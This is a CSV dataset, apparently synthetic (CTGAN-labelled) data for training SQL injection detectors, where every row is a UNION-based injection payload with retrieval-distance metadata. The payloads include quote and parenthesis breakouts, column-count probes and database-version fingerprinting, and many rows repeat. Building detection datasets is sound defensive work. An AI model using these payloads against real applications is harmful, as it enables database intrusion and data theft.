id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000031,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000319,4.185509085313001
CTGAN_000032,attack,union,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",nearest_attack_euclidean,R001312,4.6606850716777135
CTGAN_000033,attack,union,"-9039'  )   union all select 8058,8058,8058,8058,8058--",nearest_attack_euclidean,R000310,5.591693461307913
CTGAN_000034,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000446,6.244952455100778
CTGAN_000035,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000046,8.511047100616949
CTGAN_000036,attack,union,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000733,6.630969833043321
CTGAN_000037,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,6.590198286164441
CTGAN_000038,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000835,5.72055080004163
CTGAN_000039,attack,union,"-9922'   )    )    union all select 2193,2193,2193--",nearest_attack_euclidean,R000670,5.681173136599639
CTGAN_000040,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R001142,5.01427467804193
CTGAN_000041,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,5.317357071708563
CTGAN_000042,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000898,4.854098536514243
CTGAN_000043,attack,union,"-9039'  )   union all select 8058,8058,8058,8058,8058--",nearest_attack_euclidean,R000310,7.270220897923225
CTGAN_000044,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R000438,4.416210374972805
CTGAN_000045,attack,union,"1' where 4358  =  4358 union all select null,null,null,null--",nearest_attack_euclidean,R001203,4.029205488413456
CTGAN_000046,attack,union,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",nearest_attack_euclidean,R001341,4.464124122924644
CTGAN_000047,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R001134,4.622121717910684
CTGAN_000048,attack,union,"-3361   )    )    union all select 2827,2827,2827,2827#",nearest_attack_euclidean,R000244,7.533735444339872
CTGAN_000049,attack,union,"1%'   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R001395,5.5389258866097695
CTGAN_000050,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001269,5.368874682583314
CTGAN_000051,attack,union,"-5313'  )   union all select 7187,7187,7187#",nearest_attack_euclidean,R000318,4.951110527193749
CTGAN_000052,attack,union,"1""   )    )    as iqgd where 7611  =  7611 union all select null,null,null,null,null#",nearest_attack_euclidean,R001487,6.774519989864716
CTGAN_000053,attack,union,"-8707'  )   union all select 5609,5609,5609--",nearest_attack_euclidean,R000788,3.246396282581617
CTGAN_000054,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R000580,4.145529747740433
CTGAN_000055,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000380,6.992019549857447
CTGAN_000056,attack,union,"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",nearest_attack_euclidean,R000880,5.606087986855383
CTGAN_000057,attack,union,"1""   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R001091,5.408218840654275
CTGAN_000058,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R001315,5.806772366870423
CTGAN_000059,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R000341,5.060809104330871
CTGAN_000060,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001064,5.869504782855994
CTGAN_000061,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001509,4.289768916626462
CTGAN_000062,attack,union,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",nearest_attack_euclidean,R001341,6.598318477509249
CTGAN_000063,attack,union,"-1647'   )    )    union all select 3030,3030,3030,3030,3030,3030,3030--",nearest_attack_euclidean,R000721,6.9399257196673645
CTGAN_000064,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000777,2.9887526138626668
CTGAN_000065,attack,union,"1 union all select null,null,null,null--",nearest_attack_euclidean,R001092,4.762801365586496
CTGAN_000066,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000211,6.591951968830948
CTGAN_000067,attack,union,"1'   )    )    as fwhv where 3921  =  3921 union all select null,null--",nearest_attack_euclidean,R000368,6.194702275456116
CTGAN_000068,attack,union,"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",nearest_attack_euclidean,R000971,7.602035935022847
CTGAN_000069,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R001172,7.149295483781666
CTGAN_000070,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000280,7.087953469709284
CTGAN_000071,attack,union,"1 where 6412  =  6412 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000830,5.718596549921388
CTGAN_000072,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000932,5.037492317875832
CTGAN_000073,attack,union,"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",nearest_attack_euclidean,R001117,5.061028596450564
CTGAN_000074,attack,union,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",nearest_attack_euclidean,R000432,5.619658756276942
CTGAN_000075,attack,union,"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",nearest_attack_euclidean,R000736,4.235819581433579
CTGAN_000076,attack,union,"1' union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000928,7.119478726371887
CTGAN_000077,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000474,5.306933158170134
CTGAN_000078,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000071,7.26376415383819
CTGAN_000079,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R001165,5.0700427993977755
CTGAN_000080,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R001142,7.663054993750822
CTGAN_000081,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R001054,6.41462845879674
CTGAN_000082,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001171,4.471247364408381
CTGAN_000083,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R001351,6.450807915398323
CTGAN_000084,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000048,6.581479898853167
CTGAN_000085,attack,union,"-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--",nearest_attack_euclidean,R000681,7.5003860836657505
CTGAN_000086,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R000953,5.020202473950082
CTGAN_000087,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,5.124553871565457
CTGAN_000088,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001047,4.675944315454748
CTGAN_000089,attack,union," select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",nearest_attack_euclidean,R000137,9.106588462215258
CTGAN_000090,attack,union,"-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--",nearest_attack_euclidean,R000448,5.654678024602934
CTGAN_000091,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R001165,5.703459448121994
CTGAN_000092,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000354,6.919664892915862
CTGAN_000093,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000473,7.2206453154438535
CTGAN_000094,attack,union,"-5150   )    )     )   union all select 5660,5660,5660#",nearest_attack_euclidean,R000754,4.0179776956356
CTGAN_000095,attack,union,"1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000400,4.268918119147784
CTGAN_000096,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000890,3.8939469125729107
CTGAN_000097,attack,union,"-8771""   )    )    union all select 6302,6302,6302,6302,6302#",nearest_attack_euclidean,R000646,7.196258777425567
CTGAN_000098,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001024,3.993224715191652
CTGAN_000099,attack,union,"-6292  )   union all select 7499,7499,7499,7499,7499,7499,7499--",nearest_attack_euclidean,R000333,6.7369416677593446
CTGAN_000100,attack,union,"-4093'   )    )    union all select 5785,5785,5785#",nearest_attack_euclidean,R001249,6.765055812099166
CTGAN_000101,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000926,6.427558066431273
CTGAN_000102,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000829,7.697280527680559
CTGAN_000103,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000469,6.478002919772803
CTGAN_000104,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000192,6.160202998273579
CTGAN_000105,attack,union,"-2929""   )    )     )   union all select 8999,8999#",nearest_attack_euclidean,R000431,6.911588535071573
CTGAN_000106,attack,union,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",nearest_attack_euclidean,R000432,4.084591725882712
CTGAN_000107,attack,union,"-8943%'  )   union all select 7710,7710#",nearest_attack_euclidean,R000544,7.856111756825333
CTGAN_000108,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000504,8.541839610437657
CTGAN_000109,attack,union,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000733,6.752106976369601
CTGAN_000110,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000474,5.387249038150276
CTGAN_000111,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R000580,6.4354505334809735
CTGAN_000112,attack,union,union all select @@version--,nearest_attack_euclidean,R000128,7.79467349271791
CTGAN_000113,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000727,3.6393791322408693
CTGAN_000114,attack,union,"-7069  )   union all select 6638,6638,6638,6638,6638,6638--",nearest_attack_euclidean,R000745,4.300478189392991
CTGAN_000115,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R001172,5.342979120046352
CTGAN_000116,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000925,7.2522340552351645
CTGAN_000117,attack,union,"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",nearest_attack_euclidean,R001043,6.146429344700893
CTGAN_000118,attack,union,"-4707' union all select 4414,4414,4414,4414,4414,4414#",nearest_attack_euclidean,R001111,4.385260830975936
CTGAN_000119,attack,union,"-7683""  )   where 9664  =  9664 union all select 9664,9664,9664,9664,9664,9664,9664#",nearest_attack_euclidean,R000353,5.565441557552398
CTGAN_000120,attack,union,"-6116""   )    )    union all select 3679,3679,3679,3679,3679,3679,3679--",nearest_attack_euclidean,R001061,5.881988129444772
CTGAN_000121,attack,union,"-8735'   )    )    union all select 3262,3262,3262--",nearest_attack_euclidean,R001004,4.569799747997374
CTGAN_000122,attack,union,"-1451%'  )   union all select 7666,7666,7666#",nearest_attack_euclidean,R001290,3.3302282293385472
CTGAN_000123,attack,union,"-3361   )    )    union all select 2827,2827,2827,2827#",nearest_attack_euclidean,R000244,5.192641037963353
CTGAN_000124,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000704,6.912084678922864
CTGAN_000125,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001420,6.627323797652416
CTGAN_000126,attack,union,"1%'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000738,5.6628843856035465
CTGAN_000127,attack,union,-5389'||  (  select 'gggl' where 1020  =  1020 union all select 1020#,nearest_attack_euclidean,R001195,7.714250851163087
CTGAN_000128,attack,union,"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",nearest_attack_euclidean,R001117,5.848151413983109
CTGAN_000129,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R001332,4.404777179845639
CTGAN_000130,attack,union,"1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#",nearest_attack_euclidean,R001464,5.748563717022186
CTGAN_000131,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001171,4.0772266229525895
CTGAN_000132,attack,union,"-4692%""   )    )    union all select 1781,1781#",nearest_attack_euclidean,R001300,5.228089424467406
CTGAN_000133,attack,union,"-4707' union all select 4414,4414,4414,4414,4414,4414#",nearest_attack_euclidean,R001111,5.268959245871074
CTGAN_000134,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R001036,4.233807739472306
CTGAN_000135,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000848,5.907649559521061
CTGAN_000136,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000112,7.7260912561742145
CTGAN_000137,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001047,6.16444362506251
CTGAN_000138,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000728,4.546718894664784
CTGAN_000139,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000848,5.309660359915881
CTGAN_000140,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000466,6.941236159354597
CTGAN_000141,attack,union,"1  )   where 3915  =  3915 union all select null,null,null,null#",nearest_attack_euclidean,R001234,5.834384119078749
CTGAN_000142,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R001176,5.857479894154472
CTGAN_000143,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000825,7.251613555166102
CTGAN_000144,attack,union,"-9361""   )    )    union all select 3112#",nearest_attack_euclidean,R001328,5.545012056571606
CTGAN_000145,attack,union,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",nearest_attack_euclidean,R001226,4.342175070870824
CTGAN_000146,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000295,7.018287965518941
CTGAN_000147,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R001176,5.954967551556837
CTGAN_000148,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000425,4.040255470061399
CTGAN_000149,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R001176,5.485054123842509
CTGAN_000150,attack,union,"-2384%'   )    )    union all select 2467,2467,2467,2467#",nearest_attack_euclidean,R000896,5.876753969464817
CTGAN_000151,attack,union,"1'  )   as wtfo where 5666  =  5666 union all select null,null,null,null--",nearest_attack_euclidean,R001247,6.248926169398747
CTGAN_000152,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R000341,4.405265058194237
CTGAN_000153,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R001194,5.456092353312853
CTGAN_000154,attack,union,"1"" where 4183  =  4183 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000765,5.673376211111778
CTGAN_000155,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000048,6.437048664082503
CTGAN_000156,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R001134,5.253611638793822
CTGAN_000157,attack,union," select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",nearest_attack_euclidean,R000179,8.719963495974525
CTGAN_000158,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,5.18476498037936
CTGAN_000159,attack,union,"1' in boolean mode  )   union all select null,null,null--",nearest_attack_euclidean,R000559,5.391939744290812
CTGAN_000160,attack,union,"-1949""   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#",nearest_attack_euclidean,R000402,5.28514648367012
CTGAN_000161,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000468,4.679178699351419
CTGAN_000162,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000205,5.318054640219984
CTGAN_000163,attack,union,"-4093'   )    )    union all select 5785,5785,5785#",nearest_attack_euclidean,R001249,5.691862560197571
CTGAN_000164,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,4.242636592992833
CTGAN_000165,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000474,4.125989121551068
CTGAN_000166,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000295,4.9612635329575205
CTGAN_000167,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000848,6.8676651274142975
CTGAN_000168,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000704,6.888165505656177
CTGAN_000169,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000287,5.726611840952498
CTGAN_000170,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001509,5.859271229398206
CTGAN_000171,attack,union,"-2790%""  )   union all select 5070,5070#",nearest_attack_euclidean,R001255,3.4574460412511328
CTGAN_000172,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000122,6.354129121634618
CTGAN_000173,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,4.621866608784922
CTGAN_000174,attack,union,"1 where 2751  =  2751 union all select null,null,null,null--",nearest_attack_euclidean,R000672,5.754479167662801
CTGAN_000175,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R001366,6.071462292310464
CTGAN_000176,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000468,5.540811907413715
CTGAN_000177,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000749,5.017014374075924
CTGAN_000178,attack,union,"1'  )   as dwgv where 1525  =  1525 union all select null,null--",nearest_attack_euclidean,R000593,4.900271728332273
CTGAN_000179,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000933,5.789057871907854
CTGAN_000180,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000879,6.87199259084774
CTGAN_000181,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000230,4.5506436148629845
CTGAN_000182,attack,union,"-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--",nearest_attack_euclidean,R000667,4.664573076969393
CTGAN_000183,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,6.504672315115608
CTGAN_000184,attack,union,"-4707' union all select 4414,4414,4414,4414,4414,4414#",nearest_attack_euclidean,R001111,7.965484215017483
CTGAN_000185,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000486,3.976384714765639
CTGAN_000186,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000210,5.906314951839318
CTGAN_000187,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R001228,5.08786459497946
CTGAN_000188,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000777,6.29166213832804
CTGAN_000189,attack,union," select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000142,8.321214464709437
CTGAN_000190,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000282,4.543067449139085
CTGAN_000191,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000380,6.139971601936462
CTGAN_000192,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000378,5.119211849976092
CTGAN_000193,attack,union,"-9774'   )    )     )   union all select 6954,6954,6954#",nearest_attack_euclidean,R000678,4.760481543649516
CTGAN_000194,attack,union,"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000818,5.880023759696073
CTGAN_000195,attack,union,"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000604,5.091412274710792
CTGAN_000196,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000446,5.188089552007824
CTGAN_000197,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R001343,7.427631530512728
CTGAN_000198,attack,union,"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",nearest_attack_euclidean,R000640,5.900874080314686
CTGAN_000199,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R001431,6.3288223805528885
